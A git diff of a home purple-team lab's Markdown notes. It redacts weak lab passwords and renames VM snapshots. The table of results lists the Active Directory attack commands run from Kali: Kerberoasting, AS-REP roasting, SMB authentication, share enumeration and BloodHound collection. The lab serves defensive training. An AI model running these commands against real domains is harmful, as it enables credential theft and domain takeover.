@@ -22,11 +22,11 @@ The `lab-router` VM was expanded with a third host-only adapter on ADNet and now
 
 - **OUs:** `LabUsers`, `ServiceAccounts`
 - **Users:**
-  - `alice` / `Password123!` — Domain Admin (intentional over-privilege)
-  - `bob` / `Summer2024!` — AS-REP roastable (`DoesNotRequirePreAuth`)
-  - `carol` / `Password123!` — regular user, password reuse with `alice`
-  - `svc_sql` / `SqlSvc123!` — service account with SPN `MSSQLSvc/dc01.purple.lab:1433` (Kerberoastable)
-  - `svc_web` / `WebSvc2024!` — additional service account
+  - `alice` / `<LAB_ALICE_PW>` — Domain Admin (intentional over-privilege)
+  - `bob` / `<LAB_BOB_PW>` — AS-REP roastable (`DoesNotRequirePreAuth`)
+  - `carol` / `<LAB_CAROL_PW>` — regular user, password reuse with `alice`
+  - `svc_sql` / `<LAB_SVC_SQL_PW>` — service account with SPN `MSSQLSvc/dc01.purple.lab:1433` (Kerberoastable)
+  - `svc_web` / `<LAB_SVC_WEB_PW>` — additional service account
 - **Share:** `\\dc01\Public` with `Everyone:Modify` ACL
 - **Wazuh agents:** installed on both Windows endpoints, reporting to `10.10.0.30`
 
@@ -36,11 +36,11 @@ All of the following were executed successfully from Kali and returned usable at
 
 | Attack | Command / Tool | Result |
 |---|---|---|
-| Kerberoasting | `GetUserSPNs.py purple.lab/alice:Password123! -dc-ip 10.30.0.10 -request` | TGS hash for `svc_sql` captured |
+| Kerberoasting | `GetUserSPNs.py purple.lab/alice:<LAB_ALICE_PW> -dc-ip 10.30.0.10 -request` | TGS hash for `svc_sql` captured |
 | AS-REP roasting | `GetNPUsers.py purple.lab/bob -no-pass -dc-ip 10.30.0.10` | AS-REP hash for `bob` captured |
-| SMB auth | `netexec smb 10.30.0.10 -u alice -p 'Password123!'` | `Pwn3d!` |
-| Share enum | `smbclient -L //10.30.0.10 -U 'purple.lab\alice%Password123!'` | `Public`, `ADMIN$`, `C$`, `SYSVOL`, etc. listed |
-| BloodHound | `bloodhound-python -d purple.lab -u alice -p 'Password123!' -ns 10.30.0.10 -dc dc01.purple.lab -c All --zip` | `*_bloodhound.zip` produced |
+| SMB auth | `netexec smb 10.30.0.10 -u alice -p '<LAB_ALICE_PW>'` | `Pwn3d!` |
+| Share enum | `smbclient -L //10.30.0.10 -U 'purple.lab\alice%<LAB_ALICE_PW>'` | `Public`, `ADMIN$`, `C$`, `SYSVOL`, etc. listed |
+| BloodHound | `bloodhound-python -d purple.lab -u alice -p '<LAB_ALICE_PW>' -ns 10.30.0.10 -dc dc01.purple.lab -c All --zip` | `*_bloodhound.zip` produced |
 
 ## SIEM visibility
 
@@ -64,19 +64,19 @@ Captured in detail in [`LESSONS.md`](LESSONS.md). The most important Phase 3 les
 
 ## Snapshot to restore
 
-To repeat Phase 3 from a clean state, restore the `clean-phase3` snapshot on every VM:
+To repeat Phase 3 from a clean state, restore the `clean-phase4` snapshot on every VM:
 
 ```bash
 cd cyber-lab
-vagrant snapshot restore router clean-phase3
-vagrant snapshot restore siem clean-phase3
-vagrant snapshot restore kali clean-phase3
-vagrant snapshot restore target clean-phase3
-vagrant snapshot restore dc clean-phase3
-vagrant snapshot restore win10 clean-phase3
+vagrant snapshot restore router clean-phase4
+vagrant snapshot restore siem clean-phase4
+vagrant snapshot restore kali clean-phase4
+vagrant snapshot restore target clean-phase4
+vagrant snapshot restore dc clean-phase4
+vagrant snapshot restore win10 clean-phase4
 ```
 
-All VMs are currently running and snapshotted as `clean-phase3`.
+All VMs are currently running and snapshotted as `clean-phase4`.
 
 ## Next step
 
